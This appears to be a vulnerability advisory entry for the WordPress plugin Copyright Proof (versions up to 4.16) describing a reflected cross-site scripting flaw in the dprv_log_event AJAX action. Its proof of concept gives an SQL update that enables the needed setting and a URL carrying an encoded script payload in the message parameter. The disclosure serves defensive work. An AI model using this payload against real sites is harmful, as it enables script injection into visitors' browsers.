## WordPress Plugin Vulnerabilities

# Copyright Proof <= 4.16 - Reflected Cross-Site-Scripting

### Description

The plugin does not sanitise and escape a parameter before outputting it back via an AJAX action available to both unauthenticated and authenticated users, leading to a Reflected Cross-Site Scripting when a specific setting is enabled.

### Proof of Concept

To make it easier to verify the vulnerability without the need of registering an account within the plugin's settings, set the "dprv\_record\_IP" option to "on" in the database:
UPDATE wp\_options SET option\_value = 'on' WHERE option\_name = 'dprv\_record\_IP';
https://example.com/wp-admin/admin-ajax.php?action=dprv\_log\_event&message=%3Cscript%3Ealert(`xss`)%3C/script%3E
